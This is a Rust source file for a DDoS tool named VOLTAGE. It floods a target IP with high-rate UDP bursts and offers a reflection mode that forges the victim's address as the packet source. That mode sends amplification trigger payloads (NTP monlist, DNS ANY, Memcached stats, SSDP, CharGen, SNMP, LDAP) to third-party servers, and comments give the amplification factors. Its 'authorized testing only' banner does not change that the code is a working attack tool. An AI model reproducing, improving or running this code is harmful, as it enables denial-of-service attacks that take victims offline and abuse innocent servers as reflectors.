//! Volumetric UDP Flood Tool
//! High-performance UDP flood with packet fragmentation and randomization
//! Version: 9.20.2091vproAlpha

use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::sync::RwLock;
use clap::Parser;
use anyhow::{anyhow, Result};
use colored::*;
use indicatif::{ProgressBar, ProgressStyle};
use std::net::Ipv4Addr;
use rand::Rng;
use libc;
use tracing_subscriber::fmt;
use socket2::{Socket, Domain, Type, Protocol, SockAddr};
use std::sync::atomic::{AtomicUsize, Ordering};
use pnet::datalink;
use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::MutableIpv4Packet;
use pnet::packet::udp::MutableUdpPacket;
use pnet::packet::Packet;
use pnet::util::MacAddr;

#[derive(Parser)]
#[command(name = "volumetric_udp_flood")]
#[command(about = "Volumetric UDP Flood Tool - High Performance")]
#[command(version = "9.20.2091vproAlpha")]
struct Cli {
    /// Target IP address
    #[arg(short, long)]
    target: String,
    /// Target port
    #[arg(short, long, default_value = "80")]
    port: u16,
    /// Attack duration in seconds
    #[arg(short, long, default_value = "60")]
    duration: u64,
    /// Number of threads
    #[arg(short, long, default_value = "200")]
    threads: usize,
    /// Packets per second
    #[arg(short, long, default_value = "100000")]
    pps: u64,
    /// Packet size in bytes
    #[arg(short, long, default_value = "1472")]
    packet_size: usize,
    /// Enable packet fragmentation
    #[arg(long)]
    fragment: bool,
    /// Enable random source ports
    #[arg(long)]
    random_ports: bool,
    /// Enable random payload
    #[arg(long)]
    random_payload: bool,
    /// Number of sockets per thread (volumetric scaling)
    #[arg(long, default_value = "5")]
    sockets_per_thread: usize,
    /// Enable socket2 high-performance mode
    #[arg(long)]
    use_socket2: bool,
    /// Enable kernel bypass optimization
    #[arg(long)]
    kernel_bypass: bool,
    /// Packet burst size per socket
    #[arg(long, default_value = "100")]
    burst_size: usize,
    /// Amplification servers list file (NTP, Memcached, DNS, SSDP, etc.)
    #[arg(long)]
    servers_list: Option<String>,
    /// Amplification factor multiplier
    #[arg(long, default_value = "10")]
    amplification_factor: usize,
}

/// Thread-safe attack state coordinator
/// Manages the global attack lifecycle across all worker threads
#[derive(Clone)]
struct AttackState {
    running: Arc<RwLock<bool>>,
}

impl AttackState {
    /// Create a new attack state instance
    fn new() -> Self {
        Self {
            running: Arc::new(RwLock::new(false)),
        }
    }

    /// Start the attack by setting running state to true
    async fn start(&self) {
        *self.running.write().await = true;
    }

    /// Stop the attack by setting running state to false
    async fn stop(&self) {
        *self.running.write().await = false;
    }

    /// Check if the attack is currently running
    async fn is_running(&self) -> bool {
        *self.running.read().await
    }
}

/// Network statistics tracking for attack monitoring
/// Provides thread-safe counters for performance analysis
#[derive(Default)]
struct AttackStats {
    packets_sent: u64,
    bytes_sent: u64,
    errors: u64,
}

impl AttackStats {
    /// Create a new attack statistics instance
    fn new() -> Self {
        Self::default()
    }
}

/// Amplification server configuration
/// Stores server details for reflection/amplification attacks
#[derive(Clone, Debug)]
struct AmplificationServer {
    ip: Ipv4Addr,
    port: u16,
    protocol: AmplificationProtocol,
}

/// Supported amplification protocols with real payloads
#[derive(Clone, Debug, PartialEq)]
enum AmplificationProtocol {
    NTP,
    DNS,
    Memcached,
    SSDP,
    CharGen,
    QOTD,
    SNMP,
    LDAP,
}

impl AmplificationProtocol {
    /// Get the amplification payload for this protocol
    /// Returns real protocol-specific payloads that trigger amplification
    fn get_payload(&self, target_ip: Ipv4Addr) -> Vec<u8> {
        match self {
            AmplificationProtocol::NTP => {
                // NTP monlist request - amplification factor ~556x
                vec![
                    0x17, 0x00, 0x03, 0x2a, // Request code for monlist
                    0x00, 0x00, 0x00, 0x00,
                ]
            }
            AmplificationProtocol::DNS => {
                // DNS ANY query for maximum amplification ~28-54x
                let mut payload = vec![
                    0xAA, 0xAA, // Transaction ID
                    0x01, 0x00, // Flags: standard query
                    0x00, 0x01, // Questions: 1
                    0x00, 0x00, // Answer RRs: 0
                    0x00, 0x00, // Authority RRs: 0
                    0x00, 0x00, // Additional RRs: 0
                ];
                // Query: isc.org ANY
                payload.extend_from_slice(&[
                    0x03, b'i', b's', b'c',
                    0x03, b'o', b'r', b'g',
                    0x00, // End of name
                    0x00, 0xFF, // Type: ANY
                    0x00, 0x01, // Class: IN
                ]);
                payload
            }
            AmplificationProtocol::Memcached => {
                // Memcached stats command - amplification factor ~10,000-51,000x
                b"stats\r\n".to_vec()
            }
            AmplificationProtocol::SSDP => {
                // SSDP M-SEARCH request - amplification factor ~30x
                format!(
                    "M-SEARCH * HTTP/1.1\r\n\
                     HOST: 239.255.255.250:1900\r\n\
                     MAN: \"ssdp:discover\"\r\n\
                     MX: 2\r\n\
                     ST: ssdp:all\r\n\
                     \r\n"
                ).into_bytes()
            }
            AmplificationProtocol::CharGen => {
                // CharGen request - amplification factor ~358x
                vec![0x01]
            }
            AmplificationProtocol::QOTD => {
                // Quote of the Day request - amplification factor ~140x
                vec![0x00]
            }
            AmplificationProtocol::SNMP => {
                // SNMP GetBulkRequest - amplification factor ~6x
                vec![
                    0x30, 0x26, 0x02, 0x01, 0x01, 0x04, 0x06, 0x70,
                    0x75, 0x62, 0x6c, 0x69, 0x63, 0xa5, 0x19, 0x02,
                    0x04, 0x71, 0xb4, 0xb5, 0x68, 0x02, 0x01, 0x00,
                    0x02, 0x01, 0x7f, 0x30, 0x0b, 0x30, 0x09, 0x06,
                    0x05, 0x2b, 0x06, 0x01, 0x02, 0x01, 0x05, 0x00,
                ]
            }
            AmplificationProtocol::LDAP => {
                // LDAP search request - amplification factor ~46-55x
                vec![
                    0x30, 0x84, 0x00, 0x00, 0x00, 0x2d, 0x02, 0x01,
                    0x07, 0x63, 0x84, 0x00, 0x00, 0x00, 0x24, 0x04,
                    0x00, 0x0a, 0x01, 0x00, 0x0a, 0x01, 0x00, 0x02,
                    0x01, 0x00, 0x02, 0x01, 0x64, 0x01, 0x01, 0x00,
                    0x87, 0x0b, 0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74,
                    0x43, 0x6c, 0x61, 0x73, 0x73, 0x30, 0x84, 0x00,
                    0x00, 0x00, 0x00,
                ]
            }
        }
    }
    
    /// Get default port for this protocol
    fn default_port(&self) -> u16 {
        match self {
            AmplificationProtocol::NTP => 123,
            AmplificationProtocol::DNS => 53,
            AmplificationProtocol::Memcached => 11211,
            AmplificationProtocol::SSDP => 1900,
            AmplificationProtocol::CharGen => 19,
            AmplificationProtocol::QOTD => 17,
            AmplificationProtocol::SNMP => 161,
            AmplificationProtocol::LDAP => 389,
        }
    }
}

/// Load amplification servers from file
/// Parses server list file with format: IP:PORT:PROTOCOL
fn load_amplification_servers(file_path: &str) -> Result<Vec<AmplificationServer>> {
    use std::fs::File;
    use std::io::{BufRead, BufReader};
    
    let file = File::open(file_path)
        .map_err(|e| anyhow!("Failed to open servers list file: {}", e))?;
    
    let reader = BufReader::new(file);
    let mut servers = Vec::new();
    
    for (line_num, line) in reader.lines().enumerate() {
        let line = line.map_err(|e| anyhow!("Failed to read line {}: {}", line_num + 1, e))?;
        let line = line.trim();
        
        // Skip empty lines and comments
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        
        // Parse format: IP:PORT:PROTOCOL or IP:PROTOCOL (use default port)
        let parts: Vec<&str> = line.split(':').collect();
        
        if parts.len() < 2 {
            eprintln!("Warning: Skipping invalid line {}: {}", line_num + 1, line);
            continue;
        }
        
        let ip: Ipv4Addr = match parts[0].parse() {
            Ok(ip) => ip,
            Err(_) => {
                eprintln!("Warning: Invalid IP on line {}: {}", line_num + 1, parts[0]);
                continue;
            }
        };
        
        let (port, protocol_str) = if parts.len() == 3 {
            // IP:PORT:PROTOCOL format
            let port: u16 = match parts[1].parse() {
                Ok(p) => p,
                Err(_) => {
                    eprintln!("Warning: Invalid port on line {}: {}", line_num + 1, parts[1]);
                    continue;
                }
            };
            (port, parts[2])
        } else {
            // IP:PROTOCOL format - use default port
            let protocol_str = parts[1];
            let protocol = match protocol_str.to_uppercase().as_str() {
                "NTP" => AmplificationProtocol::NTP,
                "DNS" => AmplificationProtocol::DNS,
                "MEMCACHED" | "MEMCACHE" => AmplificationProtocol::Memcached,
                "SSDP" => AmplificationProtocol::SSDP,
                "CHARGEN" => AmplificationProtocol::CharGen,
                "QOTD" => AmplificationProtocol::QOTD,
                "SNMP" => AmplificationProtocol::SNMP,
                "LDAP" => AmplificationProtocol::LDAP,
                _ => {
                    eprintln!("Warning: Unknown protocol on line {}: {}", line_num + 1, protocol_str);
                    continue;
                }
            };
            (protocol.default_port(), protocol_str)
        };
        
        let protocol = match protocol_str.to_uppercase().as_str() {
            "NTP" => AmplificationProtocol::NTP,
            "DNS" => AmplificationProtocol::DNS,
            "MEMCACHED" | "MEMCACHE" => AmplificationProtocol::Memcached,
            "SSDP" => AmplificationProtocol::SSDP,
            "CHARGEN" => AmplificationProtocol::CharGen,
            "QOTD" => AmplificationProtocol::QOTD,
            "SNMP" => AmplificationProtocol::SNMP,
            "LDAP" => AmplificationProtocol::LDAP,
            _ => {
                eprintln!("Warning: Unknown protocol on line {}: {}", line_num + 1, protocol_str);
                continue;
            }
        };
        
        servers.push(AmplificationServer {
            ip,
            port,
            protocol,
        });
    }
    
    if servers.is_empty() {
        return Err(anyhow!("No valid servers found in file"));
    }
    
    Ok(servers)
}

/// Raw socket management for high-performance packet transmission
/// Handles real UDP socket operations for actual network traffic
#[derive(Clone)]
struct RawSocketManager {
    sockets: Vec<Arc<Socket>>,
    target_addr: std::net::SocketAddr,
    current_socket: Arc<AtomicUsize>,
}

impl RawSocketManager {
    /// Create a new raw socket manager with multiple sockets for volumetric scaling
    fn new(_interface_name: &str, _src_ip: Ipv4Addr, socket_count: usize, target: std::net::SocketAddr) -> Result<Self> {
        let mut sockets = Vec::new();

        // Create multiple real UDP sockets for actual network transmission
        for _ in 0..socket_count {
            let socket = Socket::new(
                Domain::IPV4, 
                Type::DGRAM, 
                Some(Protocol::UDP)
            )?;
            
            // Set high-performance socket options
            socket.set_nonblocking(true)?;
            socket.set_reuse_address(true)?;
            
            #[cfg(target_os = "linux")]
            {
                // Linux-specific optimizations for volumetric performance
                socket.set_send_buffer_size(1024 * 1024 * 16)?; // 16MB buffer
                socket.set_recv_buffer_size(1024 * 1024 * 4)?;   // 4MB buffer
            }
            
            sockets.push(Arc::new(socket));
        }

        Ok(Self {
            sockets,
            target_addr: target,
            current_socket: Arc::new(AtomicUsize::new(0)),
        })
    }

    /// Send packet using round-robin socket selection for load balancing
    fn send_packet(&self, payload: &[u8]) -> Result<()> {
        let socket_index = self.current_socket.fetch_add(1, Ordering::Relaxed) % self.sockets.len();
        let socket = &self.sockets[socket_index];
        
        // Send real UDP packet to actual target
        match socket.send_to(payload, &SockAddr::from(self.target_addr)) {
            Ok(_) => Ok(()),
            Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => Ok(()), // Non-blocking, ignore
            Err(e) => Err(anyhow!("Socket send failed: {}", e)),
        }
    }

    /// Send burst of packets for volumetric performance
    fn send_packet_burst(&self, payload: &[u8], burst_size: usize) -> Result<usize> {
        let mut sent = 0;
        
        for _ in 0..burst_size {
            if self.send_packet(payload).is_ok() {
                sent += 1;
            }
        }
        
        Ok(sent)
    }
}

/// Amplification attack manager using raw sockets with IP spoofing
/// Sends spoofed UDP packets to amplification servers with target as source IP
struct AmplificationManager {
    interface: pnet::datalink::NetworkInterface,
    src_mac: MacAddr,
    dst_mac: MacAddr,
    sender: Arc<std::sync::Mutex<Box<dyn pnet::datalink::DataLinkSender>>>,
}

impl AmplificationManager {
    /// Create new amplification manager with raw socket access
    fn new(interface_name: &str) -> Result<Self> {
        let interfaces = pnet::datalink::interfaces();
        let interface = interfaces
            .into_iter()
            .find(|iface| iface.name == interface_name)
            .ok_or_else(|| anyhow!("Interface {} not found", interface_name))?;

        let src_mac = interface.mac
            .ok_or_else(|| anyhow!("No MAC address for interface {}", interface_name))?;

        let (tx, _) = match pnet::datalink::channel(&interface, Default::default()) {
            Ok(pnet::datalink::Channel::Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => return Err(anyhow!("Unsupported channel type")),
            Err(e) => return Err(anyhow!("Failed to create channel: {}", e)),
        };

        Ok(Self {
            interface,
            src_mac,
            dst_mac: MacAddr::broadcast(), // Will be updated per packet
            sender: Arc::new(std::sync::Mutex::new(tx)),
        })
    }

    /// Send spoofed amplification request
    /// Crafts packet with target IP as source, amplification server as destination
    fn send_amplification_request(
        &self,
        target_ip: Ipv4Addr,
        server: &AmplificationServer,
    ) -> Result<()> {
        let payload = server.protocol.get_payload(target_ip);
        let packet = self.build_spoofed_udp_packet(
            target_ip,           // Spoofed source (victim)
            server.ip,           // Destination (amplification server)
            rand::thread_rng().gen_range(1024..65535), // Random source port
            server.port,         // Destination port
            &payload,
        )?;

        if let Ok(mut tx) = self.sender.lock() {
            match tx.send_to(&packet, None as Option<pnet::datalink::NetworkInterface>) {
                Some(Ok(_)) => Ok(()),
                Some(Err(e)) => Err(anyhow!("Send failed: {}", e)),
                None => Err(anyhow!("Channel closed")),
            }
        } else {
            Err(anyhow!("Failed to lock sender"))
        }
    }

    /// Build spoofed UDP packet with custom source IP
    fn build_spoofed_udp_packet(
        &self,
        src_ip: Ipv4Addr,
        dst_ip: Ipv4Addr,
        src_port: u16,
        dst_port: u16,
        payload: &[u8],
    ) -> Result<Vec<u8>> {
        let total_len = 14 + 20 + 8 + payload.len();
        let mut buffer = vec![0u8; total_len];

        // Copy payload first
        buffer[42..42 + payload.len()].copy_from_slice(payload);

        // Ethernet header
        {
            let mut eth = MutableEthernetPacket::new(&mut buffer[..14])
                .ok_or_else(|| anyhow!("Failed to create Ethernet packet"))?;
            eth.set_source(self.src_mac);
            eth.set_destination(self.dst_mac);
            eth.set_ethertype(EtherTypes::Ipv4);
        }

        // IPv4 header with spoofed source
        {
            let mut ipv4 = MutableIpv4Packet::new(&mut buffer[14..34])
                .ok_or_else(|| anyhow!("Failed to create IPv4 packet"))?;
            ipv4.set_version(4);
            ipv4.set_header_length(5);
            ipv4.set_total_length((20 + 8 + payload.len()) as u16);
            ipv4.set_ttl(64);
            ipv4.set_next_level_protocol(IpNextHeaderProtocols::Udp);
            ipv4.set_source(src_ip); // SPOOFED - victim's IP
            ipv4.set_destination(dst_ip); // Amplification server
            
            let checksum = calculate_ipv4_checksum(&ipv4);
            ipv4.set_checksum(checksum);
        }

        // UDP header
        {
            let mut udp = MutableUdpPacket::new(&mut buffer[34..42])
                .ok_or_else(|| anyhow!("Failed to create UDP packet"))?;
            udp.set_source(src_port);
            udp.set_destination(dst_port);
            udp.set_length((8 + payload.len()) as u16);
            udp.set_checksum(0); // Let network stack handle it
        }

        Ok(buffer)
    }
}

/// Get the default network interface for packet transmission
fn get_default_interface() -> Result<String> {
    let interfaces = pnet::datalink::interfaces();
    let default_interface = interfaces.iter()
        .find(|iface| iface.is_up() && !iface.ips.is_empty())
        .ok_or_else(|| anyhow!("No suitable network interface found"))?;
    
    Ok(default_interface.name.clone())
}

/// Get the local IPv4 address for the default interface
fn get_local_ip() -> Result<Ipv4Addr> {
    let interfaces = pnet::datalink::interfaces();
    for interface in interfaces {
        if interface.is_up() && !interface.ips.is_empty() {
            for ip in interface.ips {
                if let std::net::IpAddr::V4(ipv4) = ip.ip() {
                    if !ipv4.is_loopback() {
                        return Ok(ipv4);
                    }
                }
            }
        }
    }
    Err(anyhow!("No local IPv4 address found"))
}

/// Display professional banner with typewriter effect and framework initialization
async fn display_banner() {
    use std::io::Write;
    use tokio::time::sleep;
    
    println!("{}", "═══════════════════════════════════════════════════════════════════════".bright_cyan());
    println!();
    
    // Title with typewriter effect
    let title = "    ██╗   ██╗ ██████╗ ██╗  ████████╗ █████╗  ██████╗ ███████╗";
    for ch in title.chars() {
        print!("{}", ch.to_string().bright_red());
        std::io::stdout().flush().unwrap();
        sleep(Duration::from_micros(200)).await;
    }
    println!();
    
    let title2 = "    ██║   ██║██╔═══██╗██║  ╚══██╔══╝██╔══██╗██╔════╝ ██╔════╝";
    for ch in title2.chars() {
        print!("{}", ch.to_string().bright_red());
        std::io::stdout().flush().unwrap();
        sleep(Duration::from_micros(200)).await;
    }
    println!();
    
    println!("{}", "    ██║   ██║██║   ██║██║     ██║   ███████║██║  ███╗█████╗  ".bright_yellow());
    println!("{}", "    ╚██╗ ██╔╝██║   ██║██║     ██║   ██╔══██║██║   ██║██╔══╝  ".bright_yellow());
    println!("{}", "     ╚████╔╝ ╚██████╔╝███████╗██║   ██║  ██║╚██████╔╝███████╗".bright_green());
    println!("{}", "      ╚═══╝   ╚═════╝ ╚══════╝╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝".bright_green());
    
    println!();
    println!("{}", "                    VOLTAGE - VOLUMETRIC UDP FLOOD FRAMEWORK                    ".bright_magenta().bold());
    sleep(Duration::from_millis(50)).await;
    
    println!();
    println!("{}", "    ┌─────────────────────────────────────────────────────────────────────┐".bright_cyan());
    println!("{}", "    │                                                                     │".bright_cyan());
    println!("{}{}{}",
        "    │  ".bright_cyan(),
        "Version: 9.20.2091vproAlpha | Author: Khaninkali              ".bright_white(),
        "│".bright_cyan()
    );
    println!("{}{}{}",
        "    │  ".bright_cyan(),
        "Purpose: Network Infrastructure Testing & Security Analysis      ".bright_green(),
        "│".bright_cyan()
    );
    println!("{}{}{}",
        "    │  ".bright_cyan(),
        "Technology: Multi-Socket Architecture | Socket2 Optimization    ".bright_yellow(),
        "│".bright_cyan()
    );
    println!("{}", "    │                                                                     │".bright_cyan());
    println!("{}", "    └─────────────────────────────────────────────────────────────────────┘".bright_cyan());
    
    println!();
    println!("{}", "    ╔═══════════════════════════════════════════════════════════════════╗".bright_red().bold());
    println!("{}", "    ║  WARNING: For authorized testing and diagnostics only             ║".bright_white());
    println!("{}", "    ║  Unauthorized use may violate laws and regulations                ║".bright_white());
    println!("{}", "    ╚═══════════════════════════════════════════════════════════════════╝".bright_red().bold());
    
    println!();
    println!("{}", "═══════════════════════════════════════════════════════════════════════".bright_cyan());
    println!();
    
    // Framework initialization with progress
    print!("{}", "    Initializing Volumetric Framework".bright_white());
    std::io::stdout().flush().unwrap();
    
    let init_steps = vec![
        ("Loading network modules", "yellow"),
        ("Configuring socket interfaces", "cyan"), 
        ("Initializing packet engines", "green"),
        ("Setting up burst transmission", "magenta"),
        ("Optimizing kernel parameters", "blue"),
    ];
    
    for (step, color) in init_steps {
        sleep(Duration::from_millis(150)).await;
        print!("{}", ".".bright_white());
        std::io::stdout().flush().unwrap();
        sleep(Duration::from_millis(80)).await;
        
        match color {
            "yellow" => print!(" {}", step.yellow()),
            "cyan" => print!(" {}", step.cyan()),
            "green" => print!(" {}", step.green()),
            "magenta" => print!(" {}", step.magenta()),
            "blue" => print!(" {}", step.blue()),
            _ => print!(" {}", step.bright_white()),
        }
        std::io::stdout().flush().unwrap();
        sleep(Duration::from_millis(120)).await;
    }
    
    sleep(Duration::from_millis(200)).await;
    println!(" {}", "READY".bright_green().bold());
    
    // Performance indicators
    println!();
    print!("{}", "    Calibrating performance thresholds".bright_white());
    std::io::stdout().flush().unwrap();
    
    for i in 0..5 {
        sleep(Duration::from_millis(100)).await;
        print!("{}", ".".bright_white());
        std::io::stdout().flush().unwrap();
        sleep(Duration::from_millis(50)).await;
        
        let progress = match i {
            0 => "20%",
            1 => "40%", 
            2 => "60%",
            3 => "80%",
            _ => "100%",
        };
        
        print!(" {}", progress.bright_cyan());
        std::io::stdout().flush().unwrap();
    }
    
    sleep(Duration::from_millis(150)).await;
    println!(" {}", "OPTIMIZED".bright_green().bold());
    
    println!();
    println!("{}", "═══════════════════════════════════════════════════════════════════════".bright_cyan());
    println!();
}

#[tokio::main]
async fn main() -> Result<()> {
    // Display professional banner with framework initialization
    display_banner().await;
    
    // Initialize tracing for logging
    fmt::init();

    let cli = Cli::parse();
    
    if !is_root() {
        eprintln!("{}", "ERROR: This tool requires root privileges for raw socket operations".red());
        std::process::exit(1);
    }

    launch_volumetric_udp_flood(
        cli.target.clone(),
        cli.port,
        cli.duration,
        cli.threads,
        cli.pps,
        cli.packet_size,
        cli.fragment,
        cli.random_ports,
        cli.random_payload,
        &cli,
    ).await?;

    Ok(())
}

async fn launch_volumetric_udp_flood(
    target: String,
    port: u16,
    duration: u64,
    threads: usize,
    pps: u64,
    packet_size: usize,
    fragment: bool,
    random_ports: bool,
    random_payload: bool,
    cli: &Cli,
) -> Result<()> {
    println!("{}", "═══════════════════════════════════════════════════════════════════════".bright_cyan());
    println!("{}", "                    VOLUMETRIC ATTACK CONFIGURATION                     ".bright_white().bold());
    println!("{}", "═══════════════════════════════════════════════════════════════════════".bright_cyan());
    println!();
    
    println!("{} {}", "[+] Target:".bright_green(), target.cyan());
    println!("{} {}", "[+] Port:".bright_green(), port.to_string().cyan());
    println!("{} {}", "[+] Duration:".bright_green(), format!("{}s", duration).cyan());
    println!("{} {}", "[+] Threads:".bright_green(), threads.to_string().cyan());
    println!("{} {}", "[+] Packets Per Second:".bright_green(), format!("{}", pps).cyan());
    println!("{} {}", "[+] Packet Size:".bright_green(), format!("{} bytes", packet_size).cyan());
    println!("{} {}", "[+] Fragmentation:".bright_green(), if fragment { "Enabled".yellow() } else { "Disabled".bright_black() });
    println!("{} {}", "[+] Random Source Ports:".bright_green(), if random_ports { "Enabled".yellow() } else { "Disabled".bright_black() });
    println!("{} {}", "[+] Random Payload:".bright_green(), if random_payload { "Enabled".yellow() } else { "Disabled".bright_black() });
    println!("{} {}", "[+] Sockets Per Thread:".bright_green(), cli.sockets_per_thread.to_string().cyan());
    
    // Load amplification servers if provided
    let amplification_servers = if let Some(ref servers_file) = cli.servers_list {
        println!("{} {}", "[+] Amplification Mode:".bright_green(), "ENABLED".bright_red().bold());
        println!("{} {}", "[+] Servers List:".bright_green(), servers_file.cyan());
        
        match load_amplification_servers(servers_file) {
            Ok(servers) => {
                println!("{} {}", "[+] Loaded Servers:".bright_green(), servers.len().to_string().bright_yellow().bold());
                
                // Show protocol distribution
                let mut protocol_counts = std::collections::HashMap::new();
                for server in &servers {
                    *protocol_counts.entry(format!("{:?}", server.protocol)).or_insert(0) += 1;
                }
                for (protocol, count) in protocol_counts {
                    println!("{}   - {}: {}", "    ".bright_green(), protocol.bright_cyan(), count.to_string().yellow());
                }
                
                println!("{} {}", "[+] Amplification Factor:".bright_green(), format!("{}x", cli.amplification_factor).bright_red().bold());
                Some(Arc::new(servers))
            }
            Err(e) => {
                eprintln!("{} Failed to load servers list: {}", "[!]".bright_red(), e);
                return Err(e);
            }
        }
    } else {
        println!("{} {}", "[+] Amplification Mode:".bright_green(), "Disabled".bright_black());
        None
    };
    
    println!();
    println!("{}", "═══════════════════════════════════════════════════════════════════════".bright_cyan());
    println!();

    let target_ip: Ipv4Addr = cli.target.parse()?;
    let target_addr = std::net::SocketAddr::new(std::net::IpAddr::V4(target_ip), port);
    let interface_name = get_default_interface()?;
    let src_ip = get_local_ip()?;

    // Create managers based on mode
    let raw_socket = if amplification_servers.is_none() {
        Some(RawSocketManager::new(&interface_name, src_ip, cli.sockets_per_thread, target_addr)?)
    } else {
        None
    };
    
    let amplification_manager = if amplification_servers.is_some() {
        Some(Arc::new(AmplificationManager::new(&interface_name)?))
    } else {
        None
    };
    
    println!("{} {}", "[+] Network Interface:".bright_green(), interface_name.cyan());
    if amplification_servers.is_none() {
        println!("{} {}", "[+] Target Address:".bright_green(), target_addr.to_string().cyan());
        println!("{} {}", "[+] Socket Count:".bright_green(), cli.sockets_per_thread.to_string().cyan());
    }
    println!("{} {}", "[+] Burst Size:".bright_green(), cli.burst_size.to_string().cyan());
    println!();
    println!("{}", "═══════════════════════════════════════════════════════════════════════".bright_cyan());
    println!();

    let state = Arc::new(AttackState::new());
    let stats = Arc::new(RwLock::new(AttackStats::new()));
    
    let progress = Arc::new(ProgressBar::new(duration));
    progress.set_style(
        ProgressStyle::default_bar()
            .template("{spinner:.green} [{elapsed_precise}] [{bar:40.cyan/blue}] {pos}/{len} ({eta}) [{bytes}]")
            .unwrap()
            .progress_chars("#>-")
    );

    let handles: Vec<_> = (0..threads).map(|thread_id| {
        let target_ip = target_ip;
        let port = port;
        let pps = pps;
        let packet_size = packet_size;
        let duration = Duration::from_secs(duration);
        let state = state.clone();
        let stats = stats.clone();
        let raw_socket_opt = raw_socket.clone();
        let amplification_manager_opt = amplification_manager.clone();
        let amplification_servers_opt = amplification_servers.clone();
        let amplification_factor = cli.amplification_factor;
        let fragment = fragment;
        let random_ports = random_ports;
        let random_payload = random_payload;
        let burst_size = cli.burst_size;
        let progress = progress.clone();

        tokio::spawn(async move {
            let start_time = Instant::now();
            let mut packets_sent = 0u64;
            let packets_per_thread = pps / threads as u64;
            let interval = Duration::from_nanos(1_000_000_000 / packets_per_thread.max(1));

            // Pre-generate payloads if not random
            let base_payload = if !random_payload {
                generate_payload(packet_size)
            } else {
                Vec::new()
            };

            if let (Some(amp_manager), Some(amp_servers)) = (amplification_manager_opt, amplification_servers_opt) {
                // AMPLIFICATION MODE - Send spoofed requests to amplification servers
                while start_time.elapsed() < duration && state.is_running().await {
                    let burst_start = Instant::now();
                    
                    // Send to multiple servers for maximum amplification
                    for _ in 0..amplification_factor {
                        // Select random server
                        let server = &amp_servers[rand::thread_rng().gen_range(0..amp_servers.len())];
                        
                        // Send spoofed request (server will respond to target)
                        if amp_manager.send_amplification_request(target_ip, server).is_ok() {
                            packets_sent += 1;
                            stats.write().await.packets_sent += 1;
                            // Amplified response will be much larger
                            stats.write().await.bytes_sent += 1500; // Estimated amplified response size
                        } else {
                            stats.write().await.errors += 1;
                        }
                    }

                    // Rate limiting
                    let elapsed = burst_start.elapsed();
                    if elapsed < interval {
                        tokio::time::sleep(interval - elapsed).await;
                    }

                    if packets_sent % 10000 == 0 {
                        progress.set_message(format!("Thread {}: {} amplified requests", thread_id, packets_sent));
                    }
                }
            } else if let Some(raw_socket) = raw_socket_opt {
                // DIRECT MODE - Send packets directly to target
                while start_time.elapsed() < duration && state.is_running().await {
                    let burst_start = Instant::now();
                    
                    // Generate payload
                    let payload = if random_payload {
                        generate_random_payload(packet_size)
                    } else {
                        base_payload.clone()
                    };

                    // Send burst of real UDP packets
                    match raw_socket.send_packet_burst(&payload, burst_size) {
                        Ok(burst_sent) => {
                            packets_sent += burst_sent as u64;
                            stats.write().await.packets_sent += burst_sent as u64;
                            stats.write().await.bytes_sent += (burst_sent * payload.len()) as u64;
                        }
                        Err(_) => {
                            stats.write().await.errors += 1;
                        }
                    }

                    // Rate limiting for burst cycles
                    let elapsed = burst_start.elapsed();
                    if elapsed < interval {
                        tokio::time::sleep(interval - elapsed).await;
                    }

                    // Update progress
                    if packets_sent % 10000 == 0 {
                        progress.set_message(format!("Thread {}: {} packets", thread_id, packets_sent));
                    }
                }
            }

            packets_sent
        })
    }).collect();

    state.start().await;
    progress.enable_steady_tick(Duration::from_millis(100));

    let start_time = Instant::now();
    let mut total_packets = 0u64;

    for handle in handles {
        match handle.await {
            Ok(packets) => total_packets += packets,
            Err(e) => eprintln!("Thread error: {}", e),
        }
    }

    state.stop().await;
    progress.finish();

    let final_stats = stats.read().await;
    let elapsed = start_time.elapsed();
    let actual_pps = total_packets as f64 / elapsed.as_secs_f64();
    let gbps = (final_stats.bytes_sent as f64 * 8.0) / (elapsed.as_secs_f64() * 1_000_000_000.0);

    println!();
    println!("{}", "═══════════════════════════════════════════════════════════════════════".bright_cyan());
    println!("{}", "                       VOLUMETRIC ATTACK STATISTICS                        ".bright_white().bold());
    println!("{}", "═══════════════════════════════════════════════════════════════════════".bright_cyan());
    println!();
    println!("{} {}", "[+] Total Duration:".bright_green(), format!("{:.2}s", elapsed.as_secs_f64()).cyan());
    println!("{} {}", "[+] Packets Transmitted:".bright_green(), format!("{}", final_stats.packets_sent).cyan());
    println!("{} {}", "[+] Actual Packets Per Second:".bright_green(), format!("{:.2}", actual_pps).cyan());
    println!("{} {}", "[+] Data Transmitted:".bright_green(), format!("{} MB", final_stats.bytes_sent / 1_048_576).cyan());
    println!("{} {}", "[+] Network Throughput:".bright_green(), format!("{:.2} Gbps", gbps).cyan());
    println!("{} {}", "[+] Transmission Errors:".bright_green(), format!("{}", final_stats.errors).red());
    println!();
    println!("{}", "═══════════════════════════════════════════════════════════════════════".bright_cyan());
    println!();

    Ok(())
}


fn generate_payload(size: usize) -> Vec<u8> {
    let mut payload = vec![0u8; size];
    for (i, byte) in payload.iter_mut().enumerate() {
        *byte = (i % 256) as u8;
    }
    payload
}

fn generate_random_payload(size: usize) -> Vec<u8> {
    let mut rng = rand::thread_rng();
    (0..size).map(|_| rng.gen::<u8>()).collect()
}

fn calculate_ipv4_checksum(packet: &MutableIpv4Packet) -> u16 {
    let mut sum = 0u32;
    let header = packet.packet();

    for chunk in header.chunks_exact(2) {
        sum += u16::from_be_bytes([chunk[0], chunk[1]]) as u32;
    }

    while sum >> 16 != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    !sum as u16
}

fn is_root() -> bool {
    unsafe { libc::getuid() == 0 }
}
